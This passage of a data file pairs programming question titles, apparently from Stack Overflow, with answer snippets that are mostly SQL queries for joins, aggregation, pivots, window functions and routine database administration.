    ( SELECT DISTINCT score
      FROM student
      ORDER BY score DESC
          LIMIT 5
    ) AS lim
    ON s.score = lim.score 
ORDER BY s.score DESC ;
"
7214,66401,What is the most efficient way to write query to get latest item from collection?,"select c.*, o.*
from (
    select customerid, max(createdOn) as MaxCreatedOn
    from Order
    group by customerid
) mo
inner join Order o on mo.customerid = o.customerid and mo.MaxCreatedOn = o.createdOn
inner join Customer c on o.customerid = c.id
"
26119,68785,"Joining two tables in linq method syntax, MVC EntityFramework","var rvClientRiskAdjs = (from ri in db.CI_CLIENTRISKADJS
                        join qb in
                            (from qb in db.QB_INVOICES_HEADER
                             orderby qb.InvoiceDt ascending
                             group qb by qb.ClientID into grp
                             select new
                             {
                                 InvoiceDt = grp.Max(s => s.InvoiceDt),
                                 ClientID = grp.Key
                             })
                        on ri.ClientID equals qb.ClientID
                        orderby qb.InvoiceDt descending
                        where ri.IsActive == 1
                        select new ClientRiskModel()
                        {
                            ClientRiskId = ri.ClientRiskID,
                            ClientName = ri.CI_CLIENTLIST.ClientName,
                            ClientId = ri.ClientID,
                            ClientRiskAdjs = ri.ClientRiskAdjs,
                            RecordValidEnddt = ri.RecordValidEnddt,
                            RecordValidStartDt = ri.RecordValidStartDt
                        })
                        .ToList();
"
24562,34948,Search for data that matches every single tag (using the LIKE operator),"SELECT m.id, group_concat(t.tag separator ', ') as tags
  FROM movies
  JOIN tags t
    ON m.id = t.mid
 GROUP BY m.id
HAVING group_concat(t.tag) like '%DAWN%'
   and group_concat(t.tag) like '%OF%'
"
21399,57775,Convert interval to minutes,"SQL> create table t (my_interval interval day to second)
  2  /

Table created.

SQL> insert into t
  2  select numtodsinterval(30,'minute') from dual union all
  3  select numtodsinterval(4,'hour') from dual
  4  /

2 rows created.

SQL> select my_interval
  2       , 60 * extract(hour from my_interval)
  3         + extract(minute from my_interval) minutes_terrible_way
  4       , extract(day from 24*60*my_interval) minutes_other_way
  5    from t
  6  /

MY_INTERVAL                    MINUTES_TERRIBLE_WAY MINUTES_OTHER_WAY
------------------------------ -------------------- -----------------
+00 00:30:00.000000                              30                30
+00 04:00:00.000000                             240               240

2 rows selected.
"
36308,10913,pivot table returns more than 1 row for the same ID,"SELECT t.personID,
       MAX(CASE WHEN t.detailCode = 'cas' then t.detailValue END) as cas,
       MAX(CASE WHEN t.detailCode = 'buy' then t.detailValue END) as buy,
       MAX(CASE WHEN t.detailCode = 'sel' then t.detailValue END) as sel,
       MAX(CASE WHEN t.detailCode = 'pla' then t.detailValue END) as pla
FROM YourTable t
GROUP BY t.personID
"
3593,61949,Can I replace values of bit field to text in creating Table,"CREATE TABLE Table1
(
  ID int 
  , name varchar(50)
  , YesNo bit
  , TrueFalse AS 
    (
      CASE WHEN YesNo = 1 Then 'True'
      ELSE 'False'
      END
    )      
);
"
34123,16852,Converting an ER diagram to relational model,"DependentPolicyId, (PK)
PolicyId,
DependentId
"
20893,12789,Find percentage of first row within the same column,"SELECT *, round(ct::numeric/first_value(ct) OVER (ORDER BY day), 4) AS pct
FROM   tbl;
"
27534,52818,MySQL : find repeating events that are outdated,"select * from events
where repeat_id > 0
group by title
having max(`timestamp`) <= CURRENT_TIMESTAMP;
"
12691,5877,sql to sum counts and add amounts from 2 tables,"SELECT 
        ""Date"", 
        ""Payment Source"", 
         SUM(Quantity) Quantity,
         SUM(""Value in Pounds"") ""Value in Pounds""
 FROM 
(
        select  [OrderDate] as ""Date"",
                  'Cobs' as ""Payment Source"", 
                COUNT(*) as ""Quantity"",
             SUM([Amount]) as ""Value in Pounds""
         from cobaltins
         where PN like 'BT%'
         group by OrderDate

        union all

        select [OrderDate] as ""Date"", '
               Cobs Adhoc' as ""Payment Source"",COUNT(*) as ""Quantity"", 
               SUM([Amount]) as ""Value in Pounds""
        FROM cobaltins_adhoc
         where name = 'Vauz'
        group by OrderDate
) t 
GROUP BY 
        ""Date"", 
        ""Payment Source""
"
16693,29019,DB2: select all rows of data when multiple categories types of a column for each primary ID is found,"select t1.*
from mytable t1
where exists(
    select 'hasford'
    from mytable t2
    where t2.id = t1.id
   and t2.car = 'Ford'
)
and exists(
    select 'hashonda'
    from mytable t3
    where t3.id = t1.id
   and t3.car = 'Honda'
)
"
15645,25936,How to get top 10 record by its score field,"var result = Context.ShopScores.OrderByDescending(c=>c.Score).Take(10);
"
926,70082,Mysql: replace string in one table based on information on another table,"drop procedure if exists proc;
delimiter //

create procedure proc()
begin
  declare done boolean default 0;
  declare path varchar(255);
  declare id int;
  declare cur cursor for select fpath, fid from webfm_file order by fid desc;
  declare continue handler for sqlstate '02000' set done = 1;

  open cur;

  block: loop
    fetch cur into path, id;

    if done then
      leave block;
    end if;

    set @from = concat('/webfm_send/', id);

    update field_data_body set
      body_value = replace(body_value, @from, path),
      body_summary = replace(body_summary, @from, path);
  end loop;

  close cur;
end//

delimiter ;

call proc();
"
10663,67888,Getting View's Column Description,"SELECT VIEW_COLUMN_NAME=c.name,VIEW_CATALOG,VIEW_SCHEMA,VIEW_NAME,TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME, ep.value as 'COLUMN_DESCRIPTION'
FROM sys.columns c
INNER JOIN sys.views vw on c.OBJECT_ID = vw.OBJECT_ID
INNER JOIN sys.schemas s ON s.schema_id = vw.schema_id
LEFT JOIN INFORMATION_SCHEMA.VIEW_COLUMN_USAGE vcu on vw.name = vcu.VIEW_NAME and s.name = vcu.VIEW_SCHEMA and c.name = vcu.COLUMN_NAME
LEFT JOIN (
    SELECT distinct SCM_Name=SCM.Name,TBL_Name=TBL.name,COLName=COL.name,COL_Object_id= COL.object_id,COL_column_id=COL.column_id
    FROM
    SYS.COLUMNS COL
    INNER JOIN SYS.TABLES TBL on COL.object_id = TBL.object_id
    INNER JOIN SYS.SCHEMAS SCM ON TBL.schema_id = SCM.schema_id) tempTBL on tempTBL.TBL_Name=vcu.TABLE_NAME and tempTBL.SCM_Name=TABLE_SCHEMA and tempTBL.COLName = vcu.COLUMN_NAME
Left join sys.extended_properties ep on tempTBL.COL_Object_id = ep.major_id and tempTBL.COL_column_id = ep.minor_id
where vw.NAME = 'v_ProductInfo'
"
32526,1334,looping in sql where certain value is equal to something,"INSERT INTO sampleTable
       (  
       ,ID
       ,aa
       ,bb
       ,cc
       ,dd
       ,ee
       )  
      SELECT     
       ,id 
       ,aa  
       ,bb
       ,cc  
       ,dd 
       ,ee 
from otherTable where value=""something""
"
13805,49447,SQL How to create a value for a new column based on the count of an existing column by groups?,"select Max(Counting) as Total, student, stdType,
       sum(case when score = '3' then 1 else 0 end) as Score3,
       sum(case when score = '4' then 1 else 0 end) as Score4
from #tempBWMSHonors3
group by student, stdType;
"
22351,62478,Search of table names,"select name
  from DBname.sys.tables
 where name like '%xxx%'
   and is_ms_shipped = 0; -- << comment out if you really want to see them
"
31525,64238,SQL [Oracle]: Count number of previous records with same client ID,"select r.*,
       (row_number() over (partition by client_id order by reg_start) - 1) as cnt
from registrations r;
"
24050,74497,ADO.NET with VB.NET - SELECT INTO query,"dbCmd = New OleDbCommand(""SELECT first_name INTO newtable FROM test1"", odbconnect)
cbCmd.ExecuteNonQuery()
"
8883,5753,How to do <Enter> in SQL?,"select text1 || E'\n' || text2
from A
join B u
using (id)
"
17014,32322,How to sum multiple Product Prices for a unique order,"select o.order_id, o.item_id, o.price, o.quantity, q.total, o.seller_id from (
  select order_id, seller_id, sum(price) total
  from   orders
  where seller_id = 1
  group by order_id, seller_id
) q
join orders o on (o.order_id = q.order_id and q.seller_id = o.seller_id);
"
27810,20205,SQL selecting where all distinct values exist in another column,"select company
from your_table
group by company
having count(distinct year) = (select count(distinct year) from your_table)
"
30363,27985,Mysql result not returned if count 0,"SELECT 
    levels.id,
    levels.name,
    COUNT(pages.id) as pageCount
FROM levels
LEFT JOIN page_levels
    ON levels.id = page_levels.level_id
LEFT JOIN wp_pages AS pages
    ON page_levels.page_id = pages.id AND pages.status = 'open'
GROUP BY levels.id
"
18495,1132,Where clause when join is on many elements,"SELECT dbo.Customer.Number,
       dbo.Contact.Name,
       dbo.Address.StreetAddress,
   dbo.Address.Order
  FROM (SELECT TOP (100) Row_number()
                           OVER (
                             partition BY dbo.Customer.Number, dbo.Contact.Name
                             ORDER BY dbo.Address.Order) AS seq,
                         dbo.Customer.Number,
                         dbo.Contact.Name,
                         dbo.Address.StreetAddress,
                         dbo.Address.Order
          FROM dbo.Customer
               LEFT JOIN dbo.Contact
                      ON dbo.Customer.ContactId = dbo.Contact.Id
               LEFT JOIN dbo.Address
                      ON dbo.Contact.Id = dbo.Address.ContactId
     WHERE Contact.Name LIKE '%o%'
        OR Address.StreetAddress LIKE '%o%') t
 WHERE t.seq = 1 
"
19312,55159,How to test an Oracle Stored Procedure with RefCursor return type?,"create or replace procedure my_proc( p_rc OUT SYS_REFCURSOR )
as
begin
  open p_rc
   for select 1 col1
         from dual;
end;
/

variable rc refcursor;
exec my_proc( :rc );
print rc;
"
3103,28449,how to join two string collumns into one in MySQL,"select concat(name,' ',surname) as fullname
from author
"
20905,8982,join syntax in access,"select line.*, point1.x as x1,point1.y as y1,
    point2.x as x2, point.y as y2
from (line as line
left join point as point1
on line.startPoint = point1.id)
left join point as point2
on line.endPoint = point2.id
where line.id = 1;
"
9856,44163,How to select columns in a table which have values not null in another table,"select t1.*
from Table1 t1
where exists (select 1
              from Table2 t2
              where t2.code = t1.code and t2.codeTable1 is not null
             );
"
10479,29308,Sql individual SUM,"  SELECT SUM(Weight * Amount), 
         Arrival_Date 
    FROM Specifications, 
         Shipment, 
        `Product shipment` 
   WHERE Specifications.Product_Code = `Product shipment`.Product_Code 
     AND `Product shipment`.Shipment_ID = `product Shipment`.shipment_ID 
GROUP BY `Product shipment`.Shipment_ID, -- <- try add this
         Arrival_Date
"
28742,71067,Query all the employees under a single employee,"    SELECT *
      FROM employees
START WITH employee_id = 123
CONNECT BY PRIOR employee_id = manager_id
"
30145,59254,SQL like concat doesn't select specific value,"SELECT * 
FROM Table1 INNER JOIN
     Table2
     ON concat(', ', Table1.itemsid, ', ') LIKE CONCAT ('%, ', Table2.id, ', %') 
WHERE Table1.name = 'Jorn';
"
26404,70824,Get SUMs for dimension record from several fact tables,"CREATE VIEW CustomerFinances AS
    ;WITH FinancesCTE AS
    (
        Select Finances.CustomerID,
        sum(Finances.Total)Total
        from Finances
        group by Finances.CustomerID
    ),InvoicesCTE AS
    (
        Select Invoices.CustomerID,
        sum(Invoices.InvoiceValue)InvoiceValue
        from Invoices
        group by Invoices.CustomerID
    )
    SELECT C.*,
           F.Total AS FinanceTotal,
           I.InvoiceValue
    FROM   Customers C
           LEFT JOIN FinancesCTE F
               ON C.CustomerID = F.CustomerID
           LEFT JOIN InvoicesCTE I
               ON C.CustomerID = I.CustomerID

GO
"
23187,24641,Connect to Wampserver Database,"String connectionURL = ""jdbc:mysql://localhost:3306/usermaster""; 
...
Connection connection = DriverManager.getConnection(connectionURL, ""root"", ""root"");
"
7987,74058,Query that recursively compare a record with the previous one,"SELECT a.transactionid 
FROM   (SELECT *, Row_number() OVER(ORDER BY ExecutionDate) AS Rownumber 
        FROM   transactions) a 
       JOIN (SELECT transactiontypeid, Row_number()  OVER( ORDER BY ExecutionDate) AS Rownumber 
             FROM   transactions) b 
         ON a.rownumber = b.rownumber + 1 
WHERE  a.transactiontypeid = 1 
       AND b.transactiontypeid = 3 
"
2035,40376,no match when using a subselect and comparing two varchar columns,"SELECT cust_number from AnotherCustomerTable
WHERE cust_number IS NOT NULL
"
14962,19592,SQL - Multiple Joins to one table - Two values from two keys,"select
    games.game_id,
    games.game_date,
    pa.player_name as 'player_a_name',
    games.player_a_score,
    pb.player_name as 'player_b_name',
    games.player_b_score
from games
inner join players pa on (games.player_a_id = pa.player_id)
inner join players pb on (games.player_b_id = pb.player_id)
"
3405,44112,Override file while backup database,"sqlcmd -S servername -Q ""BACKUP DATABASE [DBName] TO DISK = 'C:\backup.bak' WITH INIT""
"
12698,4910,"QSqlQuery does not return rows with QSqlQuery::bindValue, but does if I insert the values with QString::arg","q.prepare(""select Focus.TextFormId as ID, Focus, TextForm, Gloss from (select TextFormId,group_concat( Transcription , ' ' ) as TextForm, group_concat( Gloss , '-' ) as Gloss from (select TextFormId,AllomorphId,Allomorph.Form as Transcription,LexicalEntryGloss.Form as Gloss from MorphologicalAnalysisMembers,Allomorph,LexicalEntryGloss where TextFormId in ( select TextFormId from MorphologicalAnalysisMembers where AllomorphId in (select _id from Allomorph where  LexicalEntryId=:One and WritingSystem=:Three) ) and AllomorphId = Allomorph._id and Allomorph.LexicalEntryId = LexicalEntryGloss.LexicalEntryId and LexicalEntryGloss.WritingSystem=:Two order by TextFormId, AllomorphOrder) group by TextFormId ) as Concatenation left join  ( select TextFormId, Form as Focus from Allomorph,MorphologicalAnalysisMembers on Allomorph._id=MorphologicalAnalysisMembers.AllomorphId and LexicalEntryId=:Four ) as Focus on Focus.TextFormId = Concatenation.TextFormId;"");
q.bindValue("":One"", mLexicalEntryId);
q.bindValue("":Two"", mGlossWs.id());
q.bindValue("":Three"", mTextFormWs.id());
q.bindValue("":Four"", mLexicalEntryId);

q.prepare(""select Focus.TextFormId as ID, Focus, TextForm, Gloss from (select TextFormId,group_concat( Transcription , ' ' ) as TextForm, group_concat( Gloss , '-' ) as Gloss from (select TextFormId,AllomorphId,Allomorph.Form as Transcription,LexicalEntryGloss.Form as Gloss from MorphologicalAnalysisMembers,Allomorph,LexicalEntryGloss where TextFormId in ( select TextFormId from MorphologicalAnalysisMembers where AllomorphId in (select _id from Allomorph where  LexicalEntryId=? and WritingSystem=?) ) and AllomorphId = Allomorph._id and Allomorph.LexicalEntryId = LexicalEntryGloss.LexicalEntryId and LexicalEntryGloss.WritingSystem=? order by TextFormId, AllomorphOrder) group by TextFormId ) as Concatenation left join  ( select TextFormId, Form as Focus from Allomorph,MorphologicalAnalysisMembers on Allomorph._id=MorphologicalAnalysisMembers.AllomorphId and LexicalEntryId=? ) as Focus on Focus.TextFormId = Concatenation.TextFormId;"");
q.addBindValue(mLexicalEntryId);
q.addBindValue(mTextFormWs.id());
q.addBindValue(mGlossWs.id());
q.addBindValue(mLexicalEntryId);
"
13206,9225,Is this possible with sql?,"INSERT INTO table(col1, col2) 
SELECT value1, 'value2' FROM table2 WHERE id = 3
"
28125,24292,Get a row by particular category SQLite android,"SELECT * FROM itemsDataTable WHERE category LIKE 'ELETRONIC'
"
14005,61585,sum of last month and total,"SELECT p.user_login, 
  SUM(IF(DATE(`when`) >= CURDATE() - INTERVAL 30 DAY,p.value,0)) sum,
  SUM(p.value) total_sum
FROM user_value p
JOIN user u
  ON u.login = p.user_login
GROUP BY p.user_login
ORDER BY sum DESC;
"
32539,6414,"i need to insert into 'Message' column by directly giving value and into 'from_id','to_id' by using select query","insert into messages ( from_id, to_id, Message) 
  select from_id, to_id, 'asdjsadkjsad...' from ( 
    select
      max( case username when 'winter' then user_id end ) as from_id,
      max( case username when 'summer' then user_id end ) as to_id
    from user
  ) as user_ids
"
34188,4605,SQL query to list department names in descending order of employee count,"SELECT     Department.DeptName, COUNT(Employee.FName) AS EmpCount
FROM         Employee INNER JOIN
                      Department ON Employee.DeptId = Department.ID
GROUP BY Department.DeptName
order by EmpCount
"
4251,68175,How to search many tables efficiently,"Select match from 
(select name as match from costumers where name like'%foo%' UNION
 select category as match from products where category like'%foo%' ...)
"
3771,66745,"What is the best way to change the type of a column in a SQL Server database, if there is data in said column?","UPDATE Table 
    SET temp_col = CASE
        WHEN value=1 
            THEN 'yes' 
            ELSE 'no' 
        END
"
10831,55178,Access SQL How to select randomly a group of contiguous rows,"Dim sSQL as String
Dim lRand as Long
Dim rs as ADODB.Recordset 'or DAO.Recordset'
lRand = VBA.Int(VBA.Rnd() * TableRecordCount) ' TableRecordCount is the number of records in the table that you need to get somehow'
sSQL = ""SELECT * FROM TableName WHERE (ID>="" & lRand - 1 & "" AND ID <="" & lRand + 1
set rs = CurrentDB.OpenRecordset(sSQL, ...)
"
12093,33546,How to add two columns from two separate MS SQL queries with different number of rows,"select ProductID, (inv.Inventory + s.Sales) as BalanceInventory
from
( 
    select  ProductID, Inventory
    from [table]
    where xxx
) inv
left outer join
(
   select  ProductID, Sales 
    from [table]
    where xxx
) s on (s.ProductID = inv.ProductID)
"
15835,70455,Query divides a column into multiple columns,"WITH AAgents AS
(
  SELECT ROW_NUMBER() over (order by AgentID) AS RN,
         AgentID AS Aagents,
         AgentName As AAgentName
  FROM Agents
  WHERE LEFT(AgentID,1)='A'
),
MAgents As
(
  SELECT ROW_NUMBER() over (order by AgentID) AS RN,
         AgentID AS Magents,
         AgentName As MAgentName
  FROM Agents
  WHERE LEFT(AgentID,1)='M'
)

SELECT
  Aagents,
  AAgentName,
  Magents,
  MAgentName
FROM AAgents
FULL OUTER JOIN MAgents
ON AAgents.RN=MAgents.RN
"
28787,19062,Joining based on condition per row,"select t1.testNr, t1.date, t2.finalID
from table1 t1 left join table2 t2
on t1.testNr=t2.testNr and t1.date between t2.from_date and t2.to_date
"
28368,46245,How to know the names of other users in oracle10g?,"select username
from all_users
/
"
5305,46665,Mysql - Run the nex AND Condition if first one is TRUE,"SELECT V.*
FROM View_Products_With_Category V
LEFT JOIN Modules M ON V.id = M.product_id
WHERE V.category_id =  '47' AND V.top_id =  0 AND M.product_id IS NULL
ORDER BY V.order, V.sub_order, V.code
"
21957,66484,Write a self join query?," select E1.ID,E1.EmpName, E.EmpName as BossName from #tmpEmployee E right join #tmpEmployee E1 on E1.EmpBossID=E.ID

ID  EmpName BossName
1   Abhijit Haris
2   Haris   Sanal
3   Sanal   NULL
"
32449,54084,using dynamic IN clause in MSSQL,"  DECLARE   @Status nVARCHAR(400),
            @SQL nvarchar(500)

SET @status = '''Closed'''+','+'''OPEN'''
set @SQL = '
select * from [MYTABLE] where status in('+@status +')'

 exec sp_executesql @SQL
GO
"
2315,35338,INSERT lots of records using SQL Server 2008,"INSERT INTO [lotto].[dbo].[CustomerSelections]
           ([draw_date]
           ,[val1]
           ,[val2]
           ,[val3]
           ,[val4]
           ,[val5]
           ,[val6])
SELECT TOP (100000 )
           '2013-07-05',
           1 + ABS(CRYPT_GEN_RANDOM(8) % 49),
           1 + ABS(CRYPT_GEN_RANDOM(8) % 49),
           1 + ABS(CRYPT_GEN_RANDOM(8) % 49),
           1 + ABS(CRYPT_GEN_RANDOM(8) % 49),
           1 + ABS(CRYPT_GEN_RANDOM(8) % 49),
           1 + ABS(CRYPT_GEN_RANDOM(8) % 49)
FROM master..spt_values v1,
     master..spt_values v2
"
30614,34773,Neo4j Query is not returning anything whereas in browser same query works fine,"db.cypher({
    query: 'MATCH (user:User {email: {email}}) RETURN user',
    params: {
        email: 'alice@example.com',
    },
}, callback);
"
7775,41519,How can I improve this SQL query？,"select 
s.execid EXECUTION_ID
,sum(case when s.result='PASS' then 1 else 0 end) PASS_CNT 
,sum(case when s.result='FAIL' then 1 else 0 end) FAIL_CNT
,sum(case when s.result='NORESULT' then 1 else 0 end) NORESULT_CNT
from STAT_RESULTS s
group by s.execid
"
30782,40211,Find unmatched records,"SELECT * FROM forms 
LEFT OUTER JOIN records
ON forms.form_id = records.form_id
WHERE records.form_id IS null
"
28227,25295,Modify database table based on a change in an ordered list,"<cfscript>
    /* Count the number of classes before the edit */
    preclasses = listToArray(PREsectionOrder, "","");
    numpreClasses = ArrayLen(preclasses);

    /* Count the number of classes after edit */
    classes = listToArray(sectionOrder, "","");
    numClasses = ArrayLen(classes);
</cfscript>

<!--- Making sure we have a 'numeric' URL id --->
<CFPARAM name=""URL.id"" default=""0"" type=""numeric"" />

<CFSET courseId = URL.id />

<!--- Only continue if the courseId is not the default 0--->
<CFIF courseId neq 0>

    <!--- Delete the existing course and its combination classes --->
    <!--- Query checks for a specific course and class id --->
    <CFQUERY NAME=""Course_seq"" DATASOURCE=""#CMS_SD#"">
        DELETE 
          FROM moodle_relationships
         WHERE mpID = <cfqueryparam cfsqltype=""cf_sql_numeric"" value=""#courseId#"" />
           AND mcID IN (<cfqueryparam cfsqltype=""cf_sql_numeric"" value=""#PREsectionOrder#"" list=""true"" separator="",""/>)
    </CFQUERY>

    <!--- Create and Set the predecessor value to default 0--->
    <cfset predecessorValue = 0 />

    <!--- Loop over the array of new classId and Insert them--->
    <CFLOOP array=""#classes#"" index=""newClass"">

        <CFQUERY NAME=""insertingNewCourse"" DATASOURCE=""#CMS_SD#"">
            INSERT INTO moodle_relationships 
                    (mpID, mcID, active, predecessor)
            VALUES  (
                    <cfqueryparam cfsqltype=""cf_sql_numeric"" value=""#courseId#"" />,
                    <cfqueryparam cfsqltype=""cf_sql_numeric"" value=""#newClass#"" />,
                    <cfqueryparam cfsqltype=""cf_sql_varchar"" value=""Y"" />,
                    <cfqueryparam cfsqltype=""cf_sql_numeric"" value=""#predecessorValue#"" />
                    )
        </CFQUERY>

        <!--- The first one goes as zero. the next one shall be the just inserted classId --->
        <cfset predecessorValue = newClass />
    </CFLOOP>

</CFIF>
"
23157,2903,SQL : Copying records within same table,"UPDATE TABLE1
SET
    [DESC] = SOURCE.[DESC],
    TYP = SOURCE.TYP,
    SUBSET = SOURCE.SUBSET,
    VAL1 = SOURCE.VAL1,
    VAL2 = SOURCE.VAL2,
    VAL3 = SOURCE.VAL3,
    VAL4 = SOURCE.VAL4,
    PREVIEW = SOURCE.PREVIEW,
    COUNTRY = SOURCE.COUNTRY
FROM (
    SELECT DEST_ID, SRC.*
    FROM
        (SELECT ID DEST_ID, RANK() OVER (ORDER BY ID) R FROM TABLE1 WHERE PREVIEW = 0) DEST
        JOIN (SELECT *, RANK() OVER (ORDER BY ID) R FROM TABLE1 WHERE PREVIEW = 1) SRC
            ON SRC.R = DEST.R
) SOURCE
WHERE TABLE1.ID = SOURCE.DEST_ID
"
3227,70362,Insert missing month in series in postgresql,"INSERT INTO myTable (id, ""count"", month)
SELECT t1.id, t1.""count"", TO_CHAR(r.d, 'YYYY-MM')
FROM myTable as t1
JOIN (SELECT generate_series((min(month) || '-01')::date, 
                                   date_trunc('month',now())::date, 
                                   '1 month') as d
            FROM myTable) AS r 
  ON (t1.month || '-01')::date < r.d
WHERE NOT EXISTS (
  SELECT 1 FROM myTable as t2
  WHERE t1.id = t2.id 
    AND ( (t1.""count"" < t2.""count"" AND (t2.month || '-01')::date <= r.d)
         OR (t1.""count"" = t2.""count"" AND (t2.month || '-01')::date = r.d))
);
"
26003,5581,"SQL UPDATE fields on only the duplicate records, initial instance must not change","with toupdate as (
      select ap.*,
             row_number() over (partition by act, plan, active, date
                                order by id
                               ) as seqnum
      from acct_plan
     )
update toupdate
    set date = getdate(),
        active = 0
    where seqnum > 1;
"
35385,27050,How can I improve this update script?,"MERGE INTO table1 R using
( SELECT SUM(T.TOTALS_TO_DATE) S, T.ID
    FROM Table2 T
    WHERE T.TYPE = 'type5' 
  group by T.ID 
) T
ON ( R.ID = T.ID)
WHEN MATCHED THEN UPDATE SET R.TOTAL = T.S
;
"
20539,45082,VB6 comparing only numeric characters in srings,"Private Function Clean(ByRef Original As String) As String
    Dim I As Long
    Dim J As Long
    Dim Char As Long

    Clean = Space$(10)
    For I = 1 To Len(Original)
        Char = AscW(Mid$(Original, I, 1))
        If 48 <= Char And Char <= 57 Then
            J = J + 1
            If J > 10 Then Exit For 'Or raise an exception.
            Mid$(Clean, J, 1) = ChrW$(Char)
        End If
    Next
End Function
"
38191,47918,Store an integer for bitwise compare in a permission model using JPA 2,"@Column(columnDefinition = ""BINARY(32)"", length = 32, nullable = false)
private byte[] bits;
"
32174,4082,having trouble with sql about movie theme,"select distinct director, title, stars
from (movie join rating using (mid)) m
where stars in (select max(stars) 
                from rating join movie using (mid) 
                where m.director = director);
"
14047,70832,How to get the count and the sum of a value in a column at the same time,"SELECT AVG(Value), Hour
FROM tableA
GROUP BY Hour
"
15930,45274,Compare row name with one cell in sql,"SELECT DISTINCT 
    B.ID, B.ID_Date, 
    Menu =
        CASE S.menu_number
            WHEN 'Menu1' THEN B.menu1
            WHEN 'Menu2' THEN B.menu2
            WHEN 'Menu3' THEN B.menu3
            ELSE 'Unknown'
        END,
    S.date
FROM 
    ordering B
    JOIN menu_plan S ON B.ID_Date = S.Date 
WHERE 
    B.Number = '4000859'
"
24401,58776,sqlite query command to find all the entry starting with capital letter,"SELECT *
FROM table1
WHERE meaning GLOB '[A-Z]*'
"
39463,3068,SQL Server Agent Job - Exists then Drop?,"DECLARE @jobId binary(16)

SELECT @jobId = job_id FROM msdb.dbo.sysjobs WHERE (name = N'Name of Your Job')
IF (@jobId IS NOT NULL)
BEGIN
    EXEC msdb.dbo.sp_delete_job @jobId
END

DECLARE @ReturnCode int
EXEC @ReturnCode =  msdb.dbo.sp_add_job @job_name=N'Name of Your Job'
"
18581,71909,SQL Server 2008 R2 Database Isolation Change,"SET TRANSACTION ISOLATION LEVEL READ UNCOMMITTED
"
4869,61190,Select if else sql,"SELECT COALESCE(T1.C, T2.C) AS C
FROM T1
LEFT OUTER JOIN T2 ON T1.[Primary Key] = T2.[Primary Key]
"
36649,13119,SQL Server - how to select x number of task per x number of workers,"select WorkerID, TaskID
FROM (
    SELECT Workers.WorkerID, Tasks.TaskID, 
        row_number() over (partition by Workers.WorkerID order by Tasks.TaskID) AS rn
    FROM Workers
    LEFT JOIN Tasks ON Workers.WorkerID = Tasks.WorkerID 
    WHERE Workers.WorkerName LIKE '%Browne%'
) where rn <= 4
"
33628,58071,How do I get all of the application-only or custom roles in an Oracle database?,"select name, decode(password, null,          'NO',
                              'EXTERNAL',    'EXTERNAL',
                              'GLOBAL',      'GLOBAL',
                              'YES'),
             decode(password, null,          'NONE',
                              'EXTERNAL',    'EXTERNAL',
                              'GLOBAL',      'GLOBAL',
                              'APPLICATION', 'APPLICATION',
                              'PASSWORD')
from  user$
where type# = 0 and name not in ('PUBLIC', '_NEXT_USER');
"
24369,74066,Optional parameters in Merge," SET      
    Account_ID = CASE 
                    WHEN source.Account_ID IS NULL 
                    THEN target.Account_ID 
                    ELSE source.Account_ID 
                 END
"
17208,21780,Varchar field from a view set to wrong length in Crystal Reports,"ALTER VIEW    
SELECT
...
    (CASE WHEN ISNULL(L.NumerListu_Fedex,'')<>'' THEN CAST('FEDEX' AS VARCHAR(50)) ELSE 'NIEOKREŚLONY' END) As Przewoznik
...
GO
"
17948,15321,How can I replace the bitmap image after rotating the original image stored any where in the mobile?,"OutputStream fOut = null;
                File file = new File(imagePath);
                try {
                    fOut = new FileOutputStream(file);
                    } catch (FileNotFoundException e) {

                    e.printStackTrace();
                }
                resizeBitmap.compress(Bitmap.CompressFormat.JPEG, 85, fOut);

            //---------------Used Media Scanner-----------
                sendBroadcast(new Intent(Intent.ACTION_MEDIA_MOUNTED, Uri
                        .parse(""file://"" + Environment.getExternalStorageDirectory())));
"
31003,27098,conditional order by clause in sql,"ORDER BY DECODE(employee_type, 'm', joining_date, birth_date, salary) ASC,
         DECODE(employee_type, 'd', joining_date, birth_date, salary) DESC
"
24823,64437,Convert strftime in SQLite request to MySQL,"WHERE DATE_FORMAT(orders.created_at, '%d%m') = .......
"
28199,73130,Why is my PL/SQL Procedure compiling with Errors,"CREATE OR REPLACE PROCEDURE procOneINOUTParameter(genericParam IN OUT VARCHAR2)
IS
BEGIN

  genericParam := 'Hello World INOUT parameter ' || genericParam;

END;
"
27765,32254,How to do query with timestamp?,"SELECT DATE(`insert`) AS day, COUNT(*) AS cnt
FROM your_table
GROUP BY day
"
12948,26919,To update the table1 considering data of table2,"update Table1 set Table1.name = 'XXX'
where Table1.id = 'some_id' 
  and exists (select 1 from Table2 where Table2.id = Table1.id and Table2.status = 'some_status');
"
6750,20994,"Postgres, count per month","WHERE createddate >= date_trunc('month', CURRENT_DATE)
"
4709,64288,How can I grant a user limited permissions in SQL Server 2008?,"use DatabaseCatalogue
go    
exec sp_addrolemember db_datareader, StudentAssistantsUsername 
go
"
34434,58936,Oracle query to get Data from table inserted in last 10 mins,"select *
from mytable
where lastupdatedDate > sysdate - (10/1440)
"
6834,10605,While-clause in T-SQL that loops forever,"WHILE EXISTS (SELECT * FROM ShoppingCartItem WHERE ShoppingCartItem.PurchID = @PurchID)
BEGIN
    SELECT TOP 1 
            @TmpGFSID = ShoppingCartItem.GFSID, 
            @TmpQuantity = ShoppingCartItem.Quantity,
            @TmpShoppingCartItemID = ShoppingCartItem.ShoppingCartItemID,
    FROM
            ShoppingCartItem INNER JOIN GoodsForSale on ShoppingCartItem.GFSID = GoodsForSale.GFSID
    WHERE ShoppingCartItem.PurchID = @PurchID

    EXEC @ErrorCode = spGoodsForSale_ReverseReservations @TmpGFSID, @TmpQuantity
    IF @ErrorCode <> 0
    BEGIN
            Goto Cleanup    
    END

    BEGIN TRANSACTION delete

        DELETE FROM ShoppingCartItem WHERE ShoppingCartItem.ShoppingCartItemID = @TmpShoppingCartItemID
        -- @@ROWCOUNT is 1 after this

    COMMIT TRANSACTION delete
END
"
13604,65170,INNER JOIN? pulling info from 2 tables - WebMatrix/Razor,"SELECT OwnerInfo.FirstName, OwnerInfo.LastName 
FROM OwnerInfo
INNER JOIN PropertyInfo on PropertyInfo.OwnerID = OwnerInfo.OwnerID
WHERE PropertyInfo.PropertyID='@0'
"
28710,18510,Creating the link between an SQL table and a form in VB," Dim conn as string =""yourconnectionstring""
 Dim DT as DataTable
 Dim query as string =""select * from mytable""
 Dim command as Sqlcommand = new sqlcommand(query,conn)

 Dim da as new SqlDataAdapter
 DA.selectcommand = command

 da.Fill(DT)

 Textbox1.text=DT.row(0)(""column"")
"
7072,15498,SQL over partition count then group by month,";WITH x AS
(
   SELECT TBL.CATEGORY, TBL.ROW_ID, datename(month, TBL.CREATED) month
   FROM
